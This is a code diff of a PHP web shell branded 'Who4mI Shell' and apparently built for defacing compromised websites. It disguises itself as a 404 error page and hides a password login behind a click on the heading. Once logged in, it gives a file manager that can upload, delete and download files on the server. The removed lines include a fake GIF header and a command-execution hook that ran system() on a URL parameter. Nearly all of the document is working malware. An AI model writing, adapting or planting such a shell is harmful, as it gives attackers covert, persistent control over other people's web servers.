@@ -1,76 +1,66 @@
 <?php
+session_start();
 $pass = "2011";
 
-if (isset($_POST['x']) && $_POST['x'] === $pass) {
-    // Masuk ke shell (script shell lu nanti masuk di bawah ini)
-} else {
-    http_response_code(404);
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>404 Not Found</title>
-<style>
-    body {
-        background-color: #fff;
-        color: #000;
-        font-family: Tahoma, sans-serif;
-        text-align: center;
-        margin: 100px;
+// Login check
+if (!isset($_SESSION['logged_in'])) {
+    if (isset($_POST['x']) && $_POST['x'] === $pass) {
+        $_SESSION['logged_in'] = true;
+    } else {
+        http_response_code(404);
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>404 Not Found</title>
+            <style>
+                body {
+                    background-color: #fff;
+                    color: #000;
+                    font-family: Tahoma, sans-serif;
+                    text-align: center;
+                    margin: 100px;
+                }
+                h1 { font-size: 18px; }
+                #formpass { display: none; margin-top: 20px; }
+                input[type="password"], input[type="submit"] {
+                    padding: 5px;
+                    font-family: monospace;
+                    border: 1px solid #ccc;
+                }
+            </style>
+            <script>
+                function showForm() {
+                    document.getElementById('formpass').style.display = 'block';
+                }
+            </script>
+        </head>
+        <body>
+            <h1 onclick="showForm()">404 Not Found</h1>
+            <p>The requested URL was not found on this server.</p>
+            <form method="POST" id="formpass">
+                <input type="password" name="x" placeholder="Password">
+                <input type="submit" value="Login">
+            </form>
+        </body>
+        </html>
+        <?php
+        exit;
     }
-    h1 {
-        font-size: 18px;
-    }
-    #formpass {
-        display: none;
-        margin-top: 20px;
-    }
-    input[type="password"] {
-        border: 1px solid #ccc;
-        padding: 5px;
-        font-family: monospace;
-    }
-    input[type="submit"] {
-        padding: 5px 10px;
-        font-family: monospace;
-    }
-</style>
-        <script>
-            function showForm() {
-                document.getElementById('formpass').style.display = 'block';
-            }
-        </script>
-    </head>
-    <body>
-        <h1 onclick="showForm()" >404 Not Found</h1>
-        <p>The requested URL was not found on this server.</p>
-        <form method="POST" id="formpass">
-            <input type="password" name="x" placeholder="Password">
-            <input type="submit" value="Login">
-        </form>
-    </body>
-    </html>
-    <?php
+}
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
     exit;
 }
-?>
 
-<?php
-// Header gambar palsu
-echo "\x47\x49\x46\x38\x39\x61"; // = GIF89a
-// Mulai kode shell
-if(isset($_GET['cmd'])) {
-  system($_GET['cmd']);
-}
-?>
-<?php
-// Config
-$shiroko_bg = 'https://imgs.search.brave.com/aiHiaNfkZbZQdi_BJD-iknqbiQSF97A2HbYlebPo6xc/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly93MC5w/ZWFrcHguY29tL3dh/bGxwYXBlci85NDQv/NTU2L0hELXdhbGxw/YXBlci1zaGlyb2tv/LWZyb20tYmx1ZS1h/cmNoaXZlLWlwaG9u/ZS0xMS10aHVtYm5h/aWwuanBn'; // Background Shiroko
+// Shell Panel Start
+$shiroko_bg = 'https://imgs.search.brave.com/aiHiaNfkZbZQdi_BJD-iknqbiQSF97A2HbYlebPo6xc/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly93MC5w/ZWFrcHguY29tL3dh/bGxwYXBlci85NDQv/NTU2L0hELXdhbGxw/YXBlci1zaGlyb2tv/LWZyb20tYmx1ZS1h/cmNoaXZlLWlwaG9u/ZS0xMS10aHVtYm5h/aWwuanBn';
 
 function readableSize($bytes) {
     $units = ['B', 'KB', 'MB', 'GB'];
-    for ($i = 0; $bytes >= 1024 && $i < count($units) - 1; $i++)
-        $bytes /= 1024;
+    for ($i = 0; $bytes >= 1024 && $i < count($units) - 1; $i++) $bytes /= 1024;
     return round($bytes, 2) . ' ' . $units[$i];
 }
 
@@ -99,7 +89,7 @@ chdir($path);
 
 $msg = '';
 
-// Handle Upload
+// Upload
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
     $target = basename($_FILES['file']['name']);
     if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
@@ -109,7 +99,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
     }
 }
 
-// Handle Delete
+// Delete
 if (isset($_GET['del'])) {
     $target = basename($_GET['del']);
     if (is_file($target)) {
@@ -121,7 +111,7 @@ if (isset($_GET['del'])) {
     }
 }
 
-// Handle Download
+// Download
 if (isset($_GET['download'])) {
     $target = basename($_GET['download']);
     if (is_file($target)) {
@@ -144,9 +134,11 @@ if (isset($_GET['download'])) {
         }
     }
 }
-?><!DOCTYPE html><html>
+?>
+<!DOCTYPE html>
+<html>
 <head>
-  <title>Who4mI Shell For Deface</title>
+  <title>Who4mI Shell</title>
   <style>
     body {
       margin: 0;
@@ -183,10 +175,14 @@ if (isset($_GET['download'])) {
     .upload-box { margin: 15px 0; }
     input[type="file"] { background: #111; color: #0f0; border: 1px solid #0f0; }
     button { background: #00ccff; color: #000; padding: 5px 10px; border: none; cursor: pointer; font-weight: bold; }
+    .topnav { text-align: right; margin-bottom: 10px; }
   </style>
 </head>
 <body>
 <div class="container">
+  <div class="topnav">
+    <a href="?logout=true">🚪 Logout</a>
+  </div>
   <h1>📁 Who4mI Shell - File Manager</h1>
   <div class="breadcrumb">
     <?php
@@ -197,10 +193,13 @@ if (isset($_GET['download'])) {
           echo "<a href='?path=" . urlencode($pathSoFar) . "'>$seg</a>/";
       }
     ?>
-  </div>  <?php echo $msg; ?>  <form class="upload-box" method="POST" enctype="multipart/form-data">
+  </div>
+  <?php echo $msg; ?>
+  <form class="upload-box" method="POST" enctype="multipart/form-data">
     <input type="file" name="file" required>
     <button type="submit">Upload</button>
-  </form>  <table>
+  </form>
+  <table>
     <tr><th>Nama</th><th>Ukuran</th><th>Modifikasi</th><th>Aksi</th></tr>
     <?php
     foreach (scandir('.') as $item) {
@@ -218,7 +217,8 @@ if (isset($_GET['download'])) {
         echo '</tr>';
     }
     ?>
-  </table>  <div style="margin-top:20px; font-size:12px; color:#aaa;">Shell by Who4mI | Fsociety Team | Blue Archive - Shiroko Theme</div>
+  </table>
+  <div style="margin-top:20px; font-size:12px; color:#aaa;">Shell by Who4mI | Fsociety Team | Blue Archive - Shiroko Theme</div>
 </div>
 </body>
 </html>
